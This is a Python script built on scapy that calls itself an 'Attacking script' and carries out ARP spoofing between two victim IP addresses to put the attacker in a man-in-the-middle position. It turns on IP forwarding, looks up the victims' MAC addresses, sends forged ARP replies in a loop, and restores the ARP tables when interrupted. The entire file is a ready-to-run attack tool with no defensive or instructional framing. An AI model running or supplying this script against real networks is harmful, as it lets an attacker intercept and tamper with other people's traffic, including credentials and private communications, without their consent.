import scapy.all as scapy
import sys
import os
import time
import argparse

parser = argparse.ArgumentParser(description="Attacking script to be run in xterm.")
parser.add_argument("-i", "--interface", type=str, help="Interface of the attacker")
parser.add_argument("-v1", "--victim1", type=str, help="Victim 1's IP address")
parser.add_argument("-v2", "--victim2", type=str, help="Victim 2's IP address")


def set_ip_forwarding(value):
    os.system(f"echo {value} > /proc/sys/net/ipv4/ip_forward")


def get_mac_by_IP(IP):
    scapy.conf.verb = 0
    ans, _ = scapy.srp(
        scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=IP),
        timeout=2,
        iface=interface,
        inter=0.1,
    )
    for _, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def reset_ARP():
    print("\n[*] Restoring Targets...")
    victim1_MAC = get_mac_by_IP(victim1_IP)
    victim2_MAC = get_mac_by_IP(victim2_IP)
    scapy.send(
        scapy.ARP(
            op=2,
            pdst=victim2_IP,
            psrc=victim1_IP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=victim1_MAC,
        ),
        count=7,
    )
    scapy.send(
        scapy.ARP(
            op=2,
            pdst=victim1_IP,
            psrc=victim2_IP,
            hwdst="ff:ff:ff:ff:ff:ff",
            hwsrc=victim2_MAC,
        ),
        count=7,
    )
    set_ip_forwarding(0)
    print("[*] Shutting Down...")
    sys.exit(1)


def spoof(victim2_MAC, victim1_MAC):
    scapy.send(scapy.ARP(op=2, pdst=victim1_IP, psrc=victim2_IP, hwdst=victim1_MAC))
    scapy.send(scapy.ARP(op=2, pdst=victim2_IP, psrc=victim1_IP, hwdst=victim2_MAC))


def mitm():
    try:
        victim1_MAC = get_mac_by_IP(victim1_IP)
    except Exception:
        set_ip_forwarding(0)
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)

    try:
        victim2_MAC = get_mac_by_IP(victim2_IP)
    except Exception:
        set_ip_forwarding(0)
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")

    while 1:
        try:
            spoof(victim2_MAC, victim1_MAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reset_ARP()


if __name__ == "__main__":
    args = parser.parse_args()
    interface = args.interface
    victim1_IP = args.victim1
    victim2_IP = args.victim2
    set_ip_forwarding(1)
    mitm()
